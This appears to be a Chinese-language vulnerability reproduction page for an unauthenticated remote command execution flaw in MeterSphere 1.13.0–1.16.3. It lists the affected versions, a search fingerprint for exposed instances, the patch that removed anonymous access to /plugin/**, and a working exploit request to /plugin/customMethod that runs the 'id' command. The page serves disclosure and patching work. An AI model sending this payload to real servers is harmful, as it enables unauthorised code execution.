# MeterSphere customMethod 远程命令执行漏洞

## 漏洞描述

2022年1月5日，知道创宇404积极防御实验团队发现了MeterSphere开源持续测试平台的一处漏洞，并向MeterSphere研发团队进行了反馈。通过该漏洞攻击者可以在未授权的情况下执行远程代码，建议MeterSphere平台用户，尤其是可通过公网访问的用户尽快进行升级修复

## 漏洞影响

<a-checkbox checked>MeterSphere v1.13.0 - v1.16.3</a-checkbox></br>

## 网络测绘

<a-checkbox checked>app="MeterSphere"</a-checkbox></br>

## 漏洞复现

登录页面

![img](../../../.vuepress/public/img/1641555749774-16f5fa84-eed7-4ec7-8c9d-0daf4085f543.png)

根据官方的修复可以看到目前版本的修复版本为删除代码片段

filterChainDefinitionMap.put("/plugin/**", "anon");

```go
https://github.com/metersphere/metersphere/pull/9140/files
```

![img](../../../.vuepress/public/img/1641555879489-faa94a48-65aa-4eb5-b116-434b10b0895a.png)

查看文件 **/backend/src/main/java/io/metersphere/controller/PluginController.java**

![img](../../../.vuepress/public/img/1641556024273-44267007-49eb-46c6-b0fd-237b0fad9d74.png)

发送请求包

```go
POST /plugin/customMethod

{"entry":"Evil","request":"id"}
```

![img](../../../.vuepress/public/img/1641559411956-ce8b8be3-71db-4c31-95fa-d75a00adce85.png)